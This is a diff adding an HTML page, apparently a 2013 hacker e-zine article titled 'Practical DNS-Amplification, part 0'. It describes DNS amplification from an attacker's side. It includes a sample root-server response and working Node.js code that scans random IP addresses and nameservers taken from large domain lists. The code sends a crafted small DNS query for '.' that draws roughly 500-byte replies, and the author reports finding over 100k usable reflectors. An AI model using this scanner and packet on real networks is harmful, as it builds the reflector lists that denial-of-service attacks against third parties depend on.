@@ -1,0 +1,154 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+	<head>
+		<META http-equiv="Content-Type" content="text/html; charset=windows-1251">
+		<link rel="stylesheet" type="text/css" href="style/style.css">
+		<title> Practical DNS-Amplification, part 0 </title>
+	</head>
+
+	<body>
+	<table cellpadding="25" align="center" >
+			<tr>
+				<td>
+					<h2><span class="header">Practical DNS-Amplification, part 0</span></h2>
+					<br>
+					<p class="text">Good old <span class="warning">DNS-Amplification</span>. 
+Those familiar with the subject could skip a paragraph or even doesn't  read this at all.</p>
+					<p class="text">Attack principle is pretty simple. Every <span class="warning">nameserver</span> responds to anything. If there's an IP
+address present into packet header, NS responds to that IP.</p>
+					<p class="text">The sense of amplification is to achieve request packet size closer to respondse packet size. 
+Most overused method is to <span class="warning">query domain "." DNS</span> responds with massive packet
+containing several root DNS records. It looks like this:</p>
+
+<PRE>
+length 540
+    209.160.35.110.domain   46.4.179.132.50723: [udp sum ok] 3- q: AAAA? . 0/13/14 
+    ns: 
+     . NS f.root-servers.net., 
+     . NS g.root-servers.net., 
+     . NS h.root-servers.net., 
+     . NS i.root-servers.net., 
+     . NS j.root-servers.net., 
+     . NS k.root-servers.net., 
+     . NS l.root-servers.net., 
+     . NS m.root-servers.net., 
+     . NS a.root-servers.net., 
+     . NS b.root-servers.net., 
+     . NS c.root-servers.net., 
+     . NS d.root-servers.net., 
+     . NS e.root-servers.net. 
+ ar: 
+  a.root-servers.net. A 198.41.0.4, 
+  a.root-servers.net. AAAA 2001:503:ba3e::2:30, 
+  b.root-servers.net. A 192.228.79.201, 
+  c.root-servers.net. A 192.33.4.12, 
+  d.root-servers.net. A 199.7.91.13, 
+  d.root-servers.net. AAAA 2001:500:2d::d, 
+  e.root-servers.net. A 192.203.230.10, 
+  f.root-servers.net. A 192.5.5.241, 
+  f.root-servers.net. AAAA 2001:500:2f::f, 
+  g.root-servers.net. A 192.112.36.4, 
+  h.root-servers.net. A 128.63.2.53, 
+  h.root-servers.net. AAAA 2001:500:1::803f:235, 
+  i.root-servers.net. A 192.36.148.17, 
+  i.root-servers.net. AAAA 2001:7fe::53 
+
+ (512)
+</PRE>
+					<p class="text">As we could see, response extends 500 bytes. That's very much, considering the request was only
+17 bytes (not counting IP/UDP headers). Normally, attacking requires servers with largest response packets. 
+There are not so many DNS's good enough, as the attack is old as the world can be, and there's many
+solutions to prevent this vulnerability from being exploited. That's covered in article's final part.</p><br>
+
+					<h3><span class="warning">Looking for vulnerable servers.</span></h3>
+					<p class="text">Attacker would need a server with enough bandwidth and hosting company being loyal to
+good outgoing UDP flow. It's better to scan with fast code, written in native languages.
+I used <span class="warning">NodeJS</span> as resolving lags overlaps time consumed to run the code. If theresn't enough 
+performance, node could be executed as a cluster with over 9000 children. The idea is simple - 
+send the packets and watch the responses. Packets could be sent to random host:</p>
+
+<PRE>
+var ip = [rand(255), rand(255), rand(255), rand(255)].join('.')
+sendPacket(ip);
+</PRE>
+
+					<p class="text">as well as choosing target hosts more precisely. To speed up the scanning it is advised to 
+get nameservers list, as large as possible. One would need a big (over 1-2 mln) list of any domains.
+As domain is taken from the list, DNS record is requested for that domain. Response would contain
+list of DNS's providing name resolution for that domain. These DNS's added to testing list.</p>
+
+
+
+<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> dns <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'dns'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+dns.<span style="color: #660066;">resolveNs</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'google.com'</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span> <span style="color: #009900;">&#40;</span>err<span style="color: #339933;">,</span> addresses<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+ <span style="color: #000066; font-weight: bold;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #339933;">!</span>err<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  addresses.<span style="color: #660066;">forEach</span><span style="color: #009900;">&#40;</span><span style="color: #003366; font-weight: bold;">function</span> <span style="color: #009900;">&#40;</span>a<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+   sendPacket<span style="color: #009900;">&#40;</span>a<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+ <span style="color: #009900;">&#125;</span>
+<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>
+
+
+
+					<p class="text">Now the fun part - send DNS packet: </p>
+
+
+
+<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> ns_packet <span style="color: #339933;">=</span> <span style="color: #003366; font-weight: bold;">new</span> Buffer<span style="color: #009900;">&#40;</span><span style="color: #009900;">&#91;</span>
+    <span style="color: #006600; font-style: italic;">//---- стандартный заголовок -----</span>
+    0x00<span style="color: #339933;">,</span> 0x03<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Айди запроса </span>
+    0x01<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Флаги</span>
+    0x00<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Число запросов : 1</span>
+    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Число ответов : 0 </span>
+    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Число авторизованных записей</span>
+    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">// Число дополнительных записей</span>
+    <span style="color: #006600; font-style: italic;">//---- тело запроса -----</span>
+    <span style="color: #006600; font-style: italic;">// запись АААА для &quot;.&quot;</span>
+    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>
+    0x1C<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 
+    0x01
+<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>
+
+
+
+					<p class="text">Code: </p> 
+					
+					
+					
+<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> client <span style="color: #339933;">=</span> dgram.<span style="color: #660066;">createSocket</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'udp4'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> sendPacket<span style="color: #009900;">&#40;</span>ip<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+ client.<span style="color: #660066;">send</span><span style="color: #009900;">&#40;</span>ns_packet<span style="color: #339933;">,</span> <span style="color: #CC0000;">0</span><span style="color: #339933;">,</span> ns_packet.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">53</span><span style="color: #339933;">,</span> ip<span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>err<span style="color: #339933;">,</span> bytes<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+  console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'sent %d bytes'</span><span style="color: #339933;">,</span> bytes<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+ <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+client.<span style="color: #660066;">on</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'error'</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+ console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'client error'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+client.<span style="color: #660066;">on</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'message'</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span>msg.<span style="color: #660066;">length</span> <span style="color: #339933;">&gt;</span> <span style="color: #CC0000;">0</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;%d bytes from %s:%d&quot;</span><span style="color: #339933;">,</span> 
+   msg.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">address</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">port</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+ <span style="color: #009900;">&#125;</span>
+<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>
+
+
+
+					<p class="text">Thus, we managed to collect more than 100k servers, which answer with packages in 1/2 kb, in just a few hours.</p> <br>
+					
+					
+					<p class="warning"><a href="dnsa_1.html">Part 1 >>></a></p> 
+					
+
+<p class="warning"><br>______________________________<br>
+MZh<br>
+2013<br><br>
+Inception E-Zine</p>
+
+				</td>
+			</tr>
+		</table>
+	</body>
+</html>
